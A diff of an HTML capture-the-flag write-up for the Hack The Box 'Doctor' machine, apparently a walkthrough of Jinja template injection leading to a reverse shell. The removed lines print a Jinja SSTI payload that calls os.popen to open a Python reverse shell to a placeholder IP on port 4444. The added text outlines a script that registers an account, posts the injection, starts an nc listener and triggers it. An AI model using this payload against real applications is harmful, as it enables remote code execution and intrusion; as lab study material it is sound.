@@ -70,14 +70,23 @@ body {
 
 	Further down the github link there is a popen() method where it appears we can run shell commands.		<br/><br/>
 	<img src="images/doctor/jinja-popen.PNG" alt="popen example" class="inline"/>         				<br/> <br/> <br/>
+
+
+	I successfully attempted it with the /usr/bin/whoami command and got a response back as dev. My next step was to see if we can run bash. 		<br/> 
+	It turned out successful and we got the shell back. This was quite a pain to do manually, so I opted to create a python script. I first			<br/> 
+	configured the burp suite proxy, then I manually created a new user, created a post, and then requested the /archives page. I grabbed 			<br/> 
+	the headers/cookies that we will need for all 3 actions. I then started on the python script								<br/> <br/> 
 	
-	<div class="highlight highlight-source-python"><pre>{<span class="pl-c1">%</span> <span class="pl-k">for</span> <span class="pl-s1">x</span> <span class="pl-c1">in</span> ().<span class="pl-s1">__class__</span>.<span class="pl-s1">__base__</span>.<span class="pl-en">__subclasses__</span>() <span class="pl-c1">%</span>}{<span class="pl-c1">%</span> <span class="pl-k">if</span> <span class="pl-s">"warning"</span> <span class="pl-c1">in</span> <span class="pl-s1">x</span>.<span class="pl-s1">__name__</span> <span class="pl-c1">%</span>}{{<span class="pl-en">x</span>().<span class="pl-s1">_module</span>.<span class="pl-s1">__builtins__</span>[<span class="pl-s">'__import__'</span>](<span class="pl-s">'os'</span>).<span class="pl-en">popen</span>(<span class="pl-s">"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="pl-cce">\"</span>ip<span class="pl-cce">\"</span>,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="pl-cce">\"</span>/bin/cat<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>flag.txt<span class="pl-cce">\"</span>]);'"</span>).<span class="pl-en">read</span>().<span class="pl-en">zfill</span>(<span class="pl-c1">417</span>)}}{<span class="pl-c1">%</span><span class="pl-s1">endif</span><span class="pl-c1">%</span>}{<span class="pl-c1">%</span> <span class="pl-s1">endfor</span> <span class="pl-c1">%</span>}</pre></div>
-
-
-	I successfully attempted it with the /usr/bin/whoami command and got a response back. My			<br/>
-	next step was to see if we can run bash. It turned out successful and we got the shell back.			<br/> 
-	I put together all of these steps in the python script below. 							<br/> <br/><br/> <br/>
-
+	<pre>
+	The script will:
+		  #1 - generate a random string and register a new account under that string
+		  #2 - login to that account
+		  #3 - create a post with our bash injection 
+		  #4 - startup a nc listener
+		  #5 - visit /archives to trigger our reverse shell
+	</pre> <br/> <br/><br/> <br/>
+		
+		
 	<h1> User.py </h1>
 	<pre>
 
@@ -94,7 +103,8 @@ body {
 	home_url     = 'http://doctors.htb/home'
 	inject_url   = 'http://doctors.htb/post/new'
 	archive_url  = 'http://doctors.htb/archive'
-
+	
+	# generate a random string
 	def get_random_string(length):
     		letters = string.ascii_lowercase
     		result_str = ''.join(random.choice(letters) for i in range(length))
@@ -155,8 +165,7 @@ body {
         		l.interactive()
 	</pre> <br/> <br/> <br/> <br/>
 
-	Our final code registers a new account under a random string, logs in, creates a post with our bash injection, starts a nc listener, and then finally 		<br/>
-	queries the /archives page to trigger the connection. The end result is a user shell as web on doctor.								<br/><br/>
+	The end result is a user shell as web on doctor.														<br/><br/>
 	<img src="images/doctor/low-priv-script.PNG" alt="user script" class="inline"/>   										<br/> <br/> <br/>
 
 
